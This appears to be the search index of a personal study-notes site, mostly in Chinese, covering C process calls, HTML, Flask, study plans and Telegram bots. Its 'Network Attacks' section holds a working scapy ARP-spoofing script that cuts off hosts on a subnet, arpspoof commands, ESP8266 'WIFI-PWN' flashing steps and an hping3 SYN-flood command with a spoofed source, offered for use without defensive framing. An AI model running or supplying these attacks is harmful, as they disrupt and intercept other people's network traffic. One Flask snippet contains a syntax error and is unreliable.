ID\uff09\u3002\u5982\u679c\u7236\u8fdb\u7a0b\u4e0d\u4fdd\u5b58\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u5b83\u5c06\u65e0\u6cd5\u901a\u8fc7\u7279\u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\u6765\u91cd\u65b0\u83b7\u53d6\u5b50\u8fdb\u7a0b\u7684 PID\u3002</p> <p>\u5982\u679c\u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0c\u7236\u8fdb\u7a0b\u4e22\u5931\u4e86\u5b50\u8fdb\u7a0b\u7684 PID\uff08\u4f8b\u5982\u6ca1\u6709\u5b58\u50a8 PID\uff09\uff0c\u6ca1\u6709\u7279\u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u6bd4\u5982 get_child_pid()\uff0c\u53ef\u4ee5\u8ba9\u7236\u8fdb\u7a0b\u7a0d\u540e\u83b7\u53d6\u5b83\u7684\u5b50\u8fdb\u7a0b\u7684 PID\u3002\u4e00\u65e6\u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u5f97\u5230\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u5c31\u9700\u8981\u7236\u8fdb\u7a0b\u81ea\u5df1\u8d1f\u8d23\u8ddf\u8e2a\u8fd9\u4e2a PID\u3002</p> <p>\u7236\u8fdb\u7a0b\u5728 fork() \u4e4b\u540e\u5982\u4f55\u4e0e\u5b50\u8fdb\u7a0b\u4ea4\u4e92\uff1f</p> <ul> <li>wait() \u548c waitpid()\uff1a\u8fd9\u4e9b\u7cfb\u7edf\u8c03\u7528\u5141\u8bb8\u7236\u8fdb\u7a0b\u7b49\u5f85\u5176\u5b50\u8fdb\u7a0b\u7ed3\u675f\uff0c\u5e76\u5728\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u65f6\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID\u3002</li> </ul> <p>child \u4e5f\u53ef\u4ee5 call fork</p>"},{"location":"cs/c/5.2/#shell","title":"Shell","text":"<p>shell \u4f1a\u7b49\u5f85\u5176\u4e2d\u6240\u6709\u5b50\u8fdb\u7a0b\u7cfb\u7edf\u540a\u5f71\u7684\u5b8c\u6210\u518d\u6267\u884c\u4e0b\u4e00\u6b65\uff0c\u4ee5\u4e0b\u7a0b\u5e8f\u4eff\u771f\u4e86\u8fd9\u4e00\u70b9</p> <pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n#include  &lt;sys/wait.h&gt;\n\nvoid function(void)\n{\n    switch ( fork() ) {\n    case -1 :\n        printf(\"fork() failed\\n\"); // process creation failed\n        exit(EXIT_FAILURE);\n        break;\n\n    case 0:                       // new child process\n        printf(\"child is pid=%i\\n\", getpid() );\n\n        for(int t=0 ; t&lt;3 ; ++t) {\n            printf(\"  tick\\n\");\n            sleep(1);\n        }\n        exit(EXIT_SUCCESS);\n        break;\n\n    default: {                    // original parent process\n        int child, status;\n\n        printf(\"parent waiting\\n\");\n        child = wait( &amp;status );\n\n        printf(\"process pid=%i terminated with exit status=%i\\n\",\n                child, WEXITSTATUS(status) );\n        exit(EXIT_SUCCESS);\n        break;\n    }\n\n    }\n}\n</code></pre>"},{"location":"cs/c/5.2/#_2","title":"\u7236\u5b50\u8fdb\u7a0b\u5185\u5b58","text":"<p>\u5f53 fork() \u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\uff0c\u5b50\u8fdb\u7a0b\u83b7\u5f97\u4e86\u7236\u8fdb\u7a0b\u5185\u5b58\u7684\u526f\u672c\uff0c\u5305\u62ec\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u3001\u6808\uff08stack\uff09\u3001\u5806\uff08heap\uff09\u3002\u7236\u8fdb\u7a0b\u4f7f\u7528\u5b83\u539f\u6709\u7684\u5185\u5b58\uff0c\u800c\u5b50\u8fdb\u7a0b\u4f1a\u4f7f\u7528\u81ea\u5df1\u62f7\u8d1d\u5230\u7684\u5185\u5b58\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b50\u8fdb\u7a0b\u5728\u5f00\u59cb\u65f6\u6709\u4e00\u4efd\u4e0e\u7236\u8fdb\u7a0b\u76f8\u540c\u7684\u5185\u5b58\u526f\u672c\u3002</p> <p>\u4f20\u7edf\u89c2\u5ff5\u662f\u7236\u8fdb\u7a0b\u8c03\u7528 fork() \u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u4e3a\u5b50\u8fdb\u7a0b\u521b\u5efa\u4e00\u4efd\u7236\u8fdb\u7a0b\u5185\u5b58\u7684\u5b8c\u6574\u526f\u672c\u3002\u7136\u800c\uff0c\u8fd9\u6837\u505a\u6548\u7387\u975e\u5e38\u4f4e\uff0c\u56e0\u4e3a\u5927\u90e8\u5206\u65f6\u5019\uff0c\u5b50\u8fdb\u7a0b\u53ef\u80fd\u5e76\u4e0d\u4f1a\u5bf9\u5927\u90e8\u5206\u5185\u5b58\u8fdb\u884c\u4fee\u6539\u3002</p> <p>\u4e3a\u4e86\u4f18\u5316\uff0c\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5165\u4e86 \u5199\u65f6\u590d\u5236 (Copy-on-Write, COW) \u7684\u673a\u5236\u3002\u8fd9\u79cd\u673a\u5236\u4e0b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u4f1a\u7acb\u5373\u4e3a\u5b50\u8fdb\u7a0b\u590d\u5236\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u5185\u5b58\uff0c\u53ea\u6709\u5728\u771f\u6b63\u9700\u8981\u7684\u65f6\u5019\u624d\u4f1a\u6267\u884c\u590d\u5236\u3002\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <p>\u5199\u65f6\u590d\u5236\u7684\u673a\u5236\u4f18\u5316\u4e86\u5185\u5b58\u7ba1\u7406\uff1a\u7236\u5b50\u8fdb\u7a0b\u53ea\u5728\u9700\u8981\u4fee\u6539\u6570\u636e\u65f6\uff0c\u624d\u4f1a\u771f\u6b63\u590d\u5236\u5185\u5b58\u3002\u8fd9\u51cf\u5c11\u4e86\u5185\u5b58\u5360\u7528\uff0c\u63d0\u5347\u4e86\u6548\u7387\u3002</p>"},{"location":"cs/c/5.2/#shell_1","title":"shell \u52a0\u901f","text":"<p>\u5728 Unix/Linux \u4e2d\uff0c\u7236\u8fdb\u7a0b\u4f7f\u7528 fork() \u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\u540e\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u9ed8\u8ba4\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\u3002\u4f46\u5b9e\u9645\u9700\u6c42\u4e2d\uff0c\u6211\u4eec\u5e0c\u671b\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u6267\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u8ba9\u5b50\u8fdb\u7a0b\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u7ee7\u7eed\u8fd0\u884c\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u3002\u8fd9\u4e2a\u65f6\u5019\uff0cexecv() \u7cfb\u7edf\u8c03\u7528\u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002</p> <p>\u5728 Unix/Linux \u4e2d\uff0c\u7236\u8fdb\u7a0b\u4f7f\u7528 fork() \u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\u540e\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u9ed8\u8ba4\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\u3002\u4f46\u5b9e\u9645\u9700\u6c42\u4e2d\uff0c\u6211\u4eec\u5e0c\u671b\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u6267\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u8ba9\u5b50\u8fdb\u7a0b\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u7ee7\u7eed\u8fd0\u884c\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u3002\u8fd9\u4e2a\u65f6\u5019\uff0cexecv() \u7cfb\u7edf\u8c03\u7528\u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nchar *program_arguments[] = {\n    \"ls\",       // \u6267\u884c\u7684\u7a0b\u5e8f\u540d\n    \"-l\",       // \u53c2\u65701\uff1a\u5217\u51fa\u6587\u4ef6\u8be6\u7ec6\u4fe1\u606f\n    \"-F\",       // \u53c2\u65702\uff1a\u9644\u52a0\u6587\u4ef6\u7c7b\u578b\n    NULL        // \u53c2\u6570\u5fc5\u987b\u4ee5 NULL \u7ed3\u675f\n};\n\nint main() {\n    execv(\"/bin/ls\", program_arguments);  // \u8c03\u7528 execv() \u8fd0\u884c ls \u547d\u4ee4\n\n    // \u5982\u679c execv \u6210\u529f\u8fd0\u884c\uff0c\u4e0b\u9762\u8fd9\u884c\u4ee3\u7801\u4e0d\u4f1a\u88ab\u6267\u884c\n    perror(\"execv failed\");               // \u5982\u679c execv \u5931\u8d25\uff0c\u6253\u5370\u9519\u8bef\u4fe1\u606f\n    exit(EXIT_FAILURE);\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5b50\u8fdb\u7a0b\u4f1a\u8fd0\u884c execv()\uff0c\u7528\u65b0\u7684\u7a0b\u5e8f /bin/ls \u66ff\u6362\u5b83\u7684\u5185\u5b58\u3002\u8fd9\u610f\u5473\u7740\u5b83\u5c06\u6267\u884c ls -l -F \u547d\u4ee4\u3002\u6210\u529f\u540e\uff0c\u5f53\u524d\u8fdb\u7a0b\u7684\u4ee3\u7801\u5c31\u5b8c\u5168\u88ab\u65b0\u7684 ls \u7a0b\u5e8f\u4ee3\u7801\u66ff\u4ee3\u3002</p> <p>\u5728\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u7684\u534f\u4f5c\u4e2d\uff0c\u901a\u5e38\u7684\u505a\u6cd5\u662f\uff1a</p> <p>\u7236\u8fdb\u7a0b\u7ee7\u7eed\u6267\u884c\u5b83\u81ea\u5df1\u7684\u4efb\u52a1\u3002</p> <p>\u5b50\u8fdb\u7a0b\u4f7f\u7528 execv() \u6216\u5176\u4ed6\u7c7b\u4f3c\u7684 exec \u7cfb\u5217\u51fd\u6570\u6765\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\u3002</p> <p>\u7236\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7 wait() \u7b49\u65b9\u5f0f\u7b49\u5f85\u5b50\u8fdb\u7a0b\u5b8c\u6210\u3002</p>"},{"location":"cs/c/5.2/#conclusion","title":"Conclusion","text":"<p>\u76ee\u7684\uff1afork() \u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\u540e\uff0cexecv() \u8ba9\u5b50\u8fdb\u7a0b\u53ef\u4ee5\u8fd0\u884c\u4e00\u4e2a\u5168\u65b0\u7684\u7a0b\u5e8f\u3002 \u884c\u4e3a\uff1a\u5b50\u8fdb\u7a0b\u7684\u5185\u5b58\u4f1a\u88ab\u65b0\u7a0b\u5e8f\u66ff\u4ee3\uff0c\u56e0\u6b64\u5b83\u53d8\u6210\u4e86\u4e00\u4e2a\u5168\u65b0\u7684\u7a0b\u5e8f\u3002 \u91cd\u8981\u6027\uff1a\u5728\u591a\u4efb\u52a1\u7cfb\u7edf\u4e2d\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u901a\u5e38\u4e0d\u4f1a\u505a\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u6240\u4ee5\u9700\u8981 execv() \u8fd9\u6837\u7684\u673a\u5236\u6765\u8fd0\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\u3002</p> <p>\u4ee5\u53ca shell \u914d\u5408 c \u8bed\u8a00\u4e00\u8d77\u8fd0\u884c\u7684\u65f6\u5019\u53c2\u6570\u4e00\u8d77\u5de5\u4f5c\u7684\u65b9\u5f0f\u5f88\u91cd\u8981</p> <p>./status 0 &amp;&amp; ./status 1</p> <p>./status 1 &amp;&amp; ./status 0</p> <p>./status 0 || ./status 1</p> <p>./status 1 || ./status 0</p> <ul> <li><code>&amp;&amp;</code> \u8fd0\u7b97\u7b26\u5728\u524d\u4e00\u4e2a\u547d\u4ee4\u6210\u529f\u65f6\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4\u3002</li> <li><code>||</code> \u8fd0\u7b97\u7b26\u5728\u524d\u4e00\u4e2a\u547d\u4ee4\u5931\u8d25\u65f6\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4\u3002</li> <li>\u9000\u51fa\u72b6\u6001\u7801 <code>0</code> \u901a\u5e38\u8868\u793a\u6210\u529f\uff0c\u975e <code>0</code> \u8868\u793a\u5931\u8d25\u3002</li> </ul>"},{"location":"cs/mern/html/html_syntax/","title":"HTML Basic Syntax","text":""},{"location":"cs/mern/html/html_syntax/#shortcut","title":"Shortcut","text":"<ul> <li>! \u52a0 return \u5feb\u901f\u5f97\u5230 html \u524d\u7f00</li> <li>shift + \u4e0a\u4e0b\u5de6\u53f3\u53ef\u4ee5\u9009\u62e9\u6587\u672c</li> <li>shift + option + \u4e0b\uff0c\u5411\u4e0b\u7c98\u8d34</li> </ul>"},{"location":"cs/mern/html/html_syntax/#headers","title":"Headers","text":"<pre><code>&lt;h1&gt;hello world&lt;/h1&gt;\n</code></pre> <ul> <li>\u8fd9\u6837\u7684\u6574\u4f53\u53eb element, <code>&lt;h1&gt;</code> \u548c <code>&lt;/h1&gt;</code> \u5206\u522b\u4e3a opening \u548c closing tag</li> <li>header \u53ea\u6709 <code>&lt;h1&gt;</code> -  <code>&lt;h6&gt;</code></li> </ul>"},{"location":"cs/mern/html/html_syntax/#paragraphs","title":"Paragraphs","text":"<p>Lorem Ipsum \u662f\u4e00\u79cd\u7528\u4e8e\u6392\u7248\u548c\u8bbe\u8ba1\u7684\u5047\u6587\uff0c\u901a\u5e38\u88ab\u7528\u4f5c\u5360\u4f4d\u7b26\u6587\u672c\u3002\u5176\u76ee\u7684\u662f\u5728\u8bbe\u8ba1\u6837\u672c\u4e2d\u63d0\u4f9b\u4e00\u4e2a\u6587\u672c\u586b\u5145\uff0c\u4ee5\u4fbf\u5728\u6ca1\u6709\u5b9e\u9645\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\u6a21\u62df\u6587\u672c\u7684\u5916\u89c2\u548c\u5e03\u5c40\u3002\u8fd9\u5bf9\u4e8e\u68c0\u67e5\u5b57\u4f53\u3001\u6392\u7248\u548c\u6574\u4f53\u8bbe\u8ba1\u6548\u679c\u975e\u5e38\u6709\u7528\u3002</p> <p>Lorem Ipsum \u7684\u6765\u6e90\u53ef\u4ee5\u8ffd\u6eaf\u5230\u53e4\u7f57\u9a6c\u65f6\u671f\u7684\u62c9\u4e01\u6587\u5b66\uff0c\u7279\u522b\u662f\u516c\u5143\u524d45\u5e74\u5de6\u53f3\u897f\u585e\u7f57\uff08Cicero\uff09\u7684\u8457\u4f5c\u300a\u5584\u4e0e\u6076\u7684\u7ec8\u6781\u7406\u8bba\u300b\uff08\"De finibus bonorum et malorum\"\uff09\u3002\u867d\u7136\u5b83\u662f\u62c9\u4e01\u6587\uff0c\u4f46 Lorem Ipsum \u5e76\u6ca1\u6709\u5b9e\u9645\u610f\u4e49\uff0c\u4ec5\u4ec5\u662f\u4e00\u79cd\u6a21\u62df\u6587\u672c\u7684\u5de5\u5177\u3002</p> <p>\u73b0\u4ee3\u8bbe\u8ba1\u548c\u5f00\u53d1\u5de5\u5177\u4e2d\uff0cLorem Ipsum \u7ecf\u5e38\u88ab\u7528\u6765\u586b\u5145\u6587\u672c\u6846\u3001\u6587\u7ae0\u548c\u6bb5\u843d\uff0c\u5e2e\u52a9\u8bbe\u8ba1\u5e08\u548c\u5f00\u53d1\u8005\u4e13\u6ce8\u4e8e\u5e03\u5c40\u548c\u529f\u80fd\uff0c\u800c\u4e0d\u662f\u5185\u5bb9\u3002</p> <p>www.lipsum.co \u6216\u8005\u81ea\u5df1 Google Funny Lorem Ipsum</p>"},{"location":"cs/mern/html/html_syntax/#void-element","title":"Void Element","text":"<pre><code>&lt;hr /&gt;\n&lt;br /&gt; \n</code></pre> <p>\u4ee5\u4e0a\u4e24\u79cd tag \u5206\u522b\u53eb horizontal rule \u548c break element\uff0c\u73b0\u4ee3\u7f51\u9875\u5f00\u53d1\u4e2d HTML \u81ea\u52a8\u5ffd\u7565\u7a7a\u683c\u548c / \u7b26\u53f7\uff0c\u76f4\u63a5\u4f7f\u7528 <code>&lt;hr&gt;</code> \u548c <code>&lt;br&gt;</code> \u5373\u53ef\uff0c\u4f46\u524d\u8005\u66f4\u4e3a\u6807\u51c6\u3002</p> <p>\u5728 paragraph \u4e2d\u7a7a\u884c\u6700\u597d\u4f7f\u7528\u591a\u4e2a <code>&lt;p&gt;</code> tag, \u4e2d\u95f4\u7a7f\u63d2 <code>&lt;br&gt;</code> \u4f1a\u5bfc\u81f4\u76f2\u4eba\u9605\u8bfb\u56f0\u96be</p>"},{"location":"cs/python/flask/1.0/","title":"1.0 Quick Start","text":""},{"location":"cs/python/flask/1.0/#theory","title":"Theory","text":"<ul> <li>Client-Side = Restaurant</li> <li>Server = Kitchen</li> <li>Database = Larder</li> </ul> <p>\u7f51\u7ad9\u5c31\u50cf\u4e00\u5bb6\u9910\u5385\uff0c\u670d\u52a1\u5458\u548c\u53a8\u5e08\u4ece\u6570\u636e\u5e93\u4e2d\u62ff\u53d6\u6570\u636e\u8fdb\u884c\u52a0\u5de5\u6e32\u67d3\u91cd\u65b0\u7ec4\u5408\u6210\u65b0\u7684 HTML CSS \u548c JS \u6587\u4ef6\u5448\u73b0\u7ed9\u7528\u6237</p> <ul> <li>Framework \u548c Library \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u4f60\u5fc5\u987b\u6309\u7167\u6846\u67b6\u7684\u89c4\u5219\u8fdb\u884c\u7f16\u7a0b</li> </ul>"},{"location":"cs/python/flask/1.0/#basics","title":"Basics","text":"Flask Import<pre><code>from flask import Flask\n\napp = Flask(__name__)\n\nprint(__name__) # (1)!\n</code></pre> <p>Flask \u5f53\u4e2d\u7684 <code>__name__</code> \u7528\u4e8e\u786e\u5b9a\u5e94\u7528\u5f53\u524d\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u5982\u679c\u76f4\u63a5\u6253\u5370 <code>__name__</code> \u4f1a\u663e\u793a <code>__main__</code> </p> <p><code>__main__</code> is the name of the scope in which top-level code executes. A module's <code>__name__</code> is set equal to <code>__main__</code> when read from standard input, a script, or from an interactive prompt.</p> <pre><code>if __name__ = \"__main__\":\n    main()\n</code></pre> <p>\u53ea\u6709\u5f53\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u811a\u672c\u8fd0\u884c\u65f6\u624d\u4f1a\u6267\u884c</p>"},{"location":"cs/python/flask/1.0/#_1","title":"\u8def\u7531","text":"<p>\u5ba2\u6237\u7aef\uff08\u4f8b\u5982 Web \u6d4f\u89c8\u5668\uff09\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Web \u670d\u52a1\u5668\uff0cWeb \u670d\u52a1\u5668\u518d\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Flask \u5e94\u7528\u5b9e\u4f8b\u3002\u5e94\u7528\u5b9e\u4f8b\u9700\u8981\u77e5\u9053\u5bf9\u6bcf\u4e2a URL \u7684\u8bf7\u6c42\u8981\u8fd0\u884c\u54ea\u4e9b\u4ee3\u7801\uff0c\u6240\u4ee5\u4fdd\u5b58\u4e86\u4e00\u4e2a URL \u5230 Python \u51fd\u6570\u7684\u6620\u5c04\u5173\u7cfb\u3002\u5904\u7406 URL \u548c\u51fd\u6570\u4e4b\u95f4\u5173\u7cfb\u7684\u7a0b\u5e8f\u79f0\u4e3a\u8def\u7531\u3002</p> <pre><code>@app.route('/')\ndef index():\n    return 'Hello World!'\n\n@app.route('/user/&lt;name&gt;')\ndef user(name):\n    return 'Hello, {}!'.format(name)\n</code></pre> <p>\u5c16\u62ec\u53f7\u91cc\u7684\u5185\u5bb9\u5c31\u662f\u52a8\u6001\u90e8\u5206\uff0cFlask \u4f1a\u5c06\u52a8\u6001\u90e8\u5206\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u51fd\u6570\uff1a</p> <p>\u8def\u7531 <code>/user/&lt;int:id&gt;</code> \u53ea\u4f1a\u5339\u914d\u52a8\u6001\u7247\u6bb5\uff0c\u8def\u7531\u4e2d\u652f\u6301 string, float \u548c path \u7c7b\u578b</p>"},{"location":"cs/python/flask/1.0/#python-decorators","title":"Python Decorators","text":"<pre><code># Functions can be nested in other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n\n    nested_function()  \nouter_function()\n\n# Functions can be returned from other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n    return nested_function\n\ninner_function = outer_function()\ninner_function()\n</code></pre>"},{"location":"cs/python/flask/1.0/#_2","title":"\u542f\u52a8\u65b9\u6cd5","text":"<p>\u6307\u4ee4\u884c\u542f\u52a8\uff1a</p> <pre><code>set FLASK_APP=hello.py\nflask run\n</code></pre> <p>\u5355\u5143\u6d4b\u8bd5\u8c03\u8bd5\uff1a</p> <pre><code>set FLASK_APP=hello.py\nset FLASK_DEBUG=1\nflask run\n</code></pre> <p>\u6216\u5728\u4ee3\u7801\u5185\u90e8\u76f4\u63a5\u5b9a\u4e49\u8c03\u8bd5</p> <pre><code>if __name__ == '__main__':\n    app.run(debug=True)\n</code></pre> <p>\u91cd\u8f7d\u5668\u548c\u8c03\u8bd5\u5668\u4f1a\u81ea\u52a8\u68c0\u6d4b\u4ee3\u7801\u53d8\u52a8\u5728 Web \u7aef\u629b\u51fa\u5f02\u5e38</p> <p><code>flask run</code> \u7684\u8be6\u7ec6\u62d3\u5c55\u53c2\u6570\u76f4\u63a5\u8f93\u5165 <code>flask --help</code> \u76f4\u63a5\u67e5\u770b\u5373\u53ef</p>"},{"location":"cyber/networkattack/","title":"Network Attacks","text":""},{"location":"cyber/networkattack/#arp-spoofing","title":"Arp Spoofing","text":""},{"location":"cyber/networkattack/#python-script","title":"Python Script","text":"<p>\u57fa\u4e8e\u767d\u540d\u5355\u5217\u8868\u8fdb\u884c ARP IP \u6bb5\u6d41\u91cf\u963b\u65ad</p> <pre><code>import scapy.all as scapy\nimport time\n\ndef scan_network(ip_range):\n    arp_request = scapy.ARP(pdst=ip_range)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    active_ips = []\n    for element in answered_list:\n        active_ips.append(element[1].psrc)\n    return active_ips\n\ndef get_mac(ip):\n    arp_request = scapy.ARP(pdst=ip)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    if answered_list:\n        return answered_list[0][1].hwsrc\n    else:\n        return None\n\ndef spoof(target_ip, spoof_ip):\n    target_mac = get_mac(target_ip)\n    if target_mac is not None:\n        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)\n        scapy.send(packet, verbose=False)\n\ndef restore(destination_ip, source_ip):\n    destination_mac = get_mac(destination_ip)\n    source_mac = get_mac(source_ip)\n    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)\n    scapy.send(packet, verbose=False)\n\n# Replace these with the actual IP range and exclusion list\nip_range = \"192.168.1.0/24\"\ngateway_ip = \"192.168.1.1\"\nexclusion_list = [\"192.168.1.1\", \"192.168.1.4\", \"192.168.1.6\"]\n\ntry:\n    active_ips = scan_network(ip_range)\n    target_ips = [ip for ip in active_ips if ip not in exclusion_list]\n    sent_packets_count = 0\n    print(active_ips)\n    while True:\n        for target_ip in target_ips:\n            spoof(target_ip, gateway_ip)\n            spoof(gateway_ip, target_ip)\n            sent_packets_count = sent_packets_count + 2\n            print(f\"\\\\r[*] Packets Sent to {target_ip} -&gt; \" + str(sent_packets_count), end=\"\")\n        time.sleep(1) # Waits for two seconds\n\nexcept KeyboardInterrupt:\n    print(\"\\\\nCtrl + C pressed.............Exiting\")\n    for target_ip in target_ips:\n        restore(gateway_ip, target_ip)\n        restore(target_ip, gateway_ip)\n    print(\"[+] Arp Spoof Stopped\")\n</code></pre>"},{"location":"cyber/networkattack/#quick-spoofing-on-linux","title":"Quick spoofing on Linux","text":"<pre><code>apt install dsniff\nnmap -sP 192.168.86.1/26\nsysctl -w net.ipv4.ip_forward=0\nsudo arpspoof -i wlan0 -t 192.168.86.30 -r 192.168.86.1\n</code></pre>"},{"location":"cyber/networkattack/#wifi-clone","title":"WIFI Clone","text":""},{"location":"cyber/networkattack/#esp8266-mcu-wifi-pwn","title":"ESP8266 MCU \u70e7\u5f55 WIFI-PWN","text":"<pre><code>pip install esptool\nesptool.py --port COM5 erase_flash\nesptool.py --port COM5 --baud 115200 write_flash -fm dio -fs 32m 0x00000 NODEMCU.bin\n</code></pre>"},{"location":"cyber/networkattack/#tcp-syn-flood","title":"TCP SYN Flood","text":"<p>\u4e3b\u8981\u4f7f\u7528 HPING3 \u5de5\u5177\u8fdb\u884c DOS \u653b\u51fb\uff1a\u4f2a\u9020 IP\u3001\u76ee\u6807 IP</p> <pre><code>hping3 -c 5000 -d 1024 -S -w 64 -p 21 --flood -a 192.168.10.254 192.168.10.120\n</code></pre>"},{"location":"handbook/csplan/","title":"CS Study Plan","text":"<p>Matt Rickard Hire for slope, not Y-Intercept.</p>"},{"location":"handbook/csplan/#stanford","title":"Stanford","text":"Course Description CS106A CS106B YouTube Lecture CS107 YouTube Lecture CS103 MIT Mathematics for Computer Science or Coursera CS161 Design and Analysis, Part 1  + Design and Analysis, Part 2 CS110 CS145 edX Compilers CS143 CS144 YouTube Lecture Video CS140 UCB https://cs162.org/ + YouTube Lecture Video Elective CS246 CS253 CS255 <ul> <li>Use https://online.stanford.edu to research the course you study first</li> <li>Check https://www.edx.org/school/stanfordonline for what you are interesting for</li> </ul>"},{"location":"handbook/csplan/#uc-san-diego","title":"UC San Diego","text":"Course Description CSE 15L A Practical Guide to Linux Commands, Editors, and Shell Programming CSE 20 Discrete Mathematics and its Applications from Kenneth Rosen &amp; Daniel Solow - How to Read and Do Proofs CSE 21 Google Drive Backup CSE 30 Stepik open course, can't use the pi-cluster CSE 140 Google Drive Backup, zybook extend one year CSE 140L Google Drive Backup CSE 100 Stepik rysnc reading CSE 101 Google Drive Backup CSE 105 Google Drive Backup MGT 172 Google Drive Backup SOCI 117 Google Drive Backup <ul> <li>Try use Latex to finish homework.</li> <li>Check your alterative textbook database before study.</li> </ul>"},{"location":"handbook/csplan/#uc-santa-cruz","title":"UC Santa Cruz","text":"Course Description CSE 130 Principles of Computer Systems Design CSE 120 Computer Architecture CSE 102 Introduction to Analysis of Algorithms CSE 185S Technical Writing for Computer Science and Engineering CSE 107 Probability and Statistics for Engineers CSE 116 Introduction to Functional Programming Elective Elective Elective Capstone elective Elective CSE 103 Computational Models"},{"location":"handbook/telegram/","title":"Telegram Guide","text":"<p>Immanuel Kant Freedom is not letting you do whatever you wanna but teaching you not to do the things you don't wanna do.<sup>1</sup></p>"},{"location":"handbook/telegram/#seo","title":"SEO","text":"<ul> <li>Telemetr.io</li> </ul> <p>Google <code>site:telemetr.io \u8d44\u6e90\u641c\u7d22\u5173\u952e\u8bcd</code></p>"},{"location":"handbook/telegram/#bots","title":"Bots","text":"<p>@gpt4bot</p> <p>@myidbot</p> <p>@scihubot</p> <p>@soundcloud_youtube_music_bot</p> <p>@Music163bot</p> <p>@bingdict_bot</p> <p>@web2album_bot</p> <p>@yihong0618_bot</p> <p>@yellow_gif_bot</p> <p>@DogeSGK_bot</p> <p>@PolarisseekBot</p> <p>@sgk2023_03_30bot</p> <p>@CopilotOfficialBot</p> <p>@reverse_image_search_bot</p> <p>@zh_secretary_bot</p> <p>@GLBetabot</p> <p>@PyrogramBot</p>"},{"location":"handbook/telegram/#tech","title":"Tech","text":"<ul> <li>\u82b1\u679c\u5c71\u5927\u5723\u8fdc\u7a0b\u5de5\u4f5c</li> <li>PagerMaid-Modify Update</li> <li>iOS \u7834\u89e3\u81ea\u7b7e\u8f6f\u4ef6\u5305</li> <li>\u5999\u5999\u5c0f\u5de5\u5177\u53d1\u5e03\u9891\u9053</li> </ul>"},{"location":"handbook/telegram/#runology","title":"Runology","text":"<ul> <li>\u6d41\u6d6a\u9632\u533a</li> </ul> <p>Reddit \u8bba\u575b\u5206\u652f\u8ba8\u8bba\u793e\u533a @china_irl</p> <ul> <li>Runology Group</li> </ul> 